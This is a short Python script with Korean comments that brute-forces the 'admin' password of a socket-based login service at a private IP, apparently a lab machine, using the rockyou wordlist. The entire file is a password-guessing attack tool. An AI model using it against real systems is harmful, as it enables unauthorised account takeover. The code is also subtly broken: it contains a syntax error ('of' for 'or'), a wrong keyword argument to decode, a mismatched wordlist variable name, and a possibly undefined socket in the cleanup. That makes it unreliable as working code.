# 소켓 통신을 위한 Python 코드
import socket
# 시간 관련 기능을 사용하기 위한 Python 코드
import time

target_IP = "10.10.247.143"
target_PORT = 8000
wordlists = "/usr/share/wordlists/rockyou.txt"

def send_socket(ip: str, port: int, password: str) -> bool:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10) # 최대 연결 유지 시간
        s.connect((ip, port))
        s.sendall(b'admin\n') # 바이트로 변환 -> 소켓 통신 시 무조건 바이트로 전송해야 함

        # 서버로부터 응답 받음
        resp = s.recv(1024).decode(error="ignore")


        if "Password:" in resp: 
            s.sendall(password.encode() + b'\n') # 패스워드 전송
            resp = s.recv(1024).decode(errors="ignore")

            if "success" in resp.lower() of "admin" in resp.lower():
                print(f'Found !! admin: {password} -> {resp.strip()}')
                return True
            else:
                print(f'[-] Failed: {password}')
    except Exception as e:
        print(f"! Error {password}")
    finally:
        s.close()
    return False


def brut_pass():
    with open(wordlist, "r", encoding="latin-1", errors="ignore") as file:
        for line in file:
            password = line.strip()
            if send_socket(target_IP, target_PORT, password):
                break # 성공 시 중단
            time.sleep(0.1) # 과부하 방지

if __name__ == "__main__":
    brut_pass()
    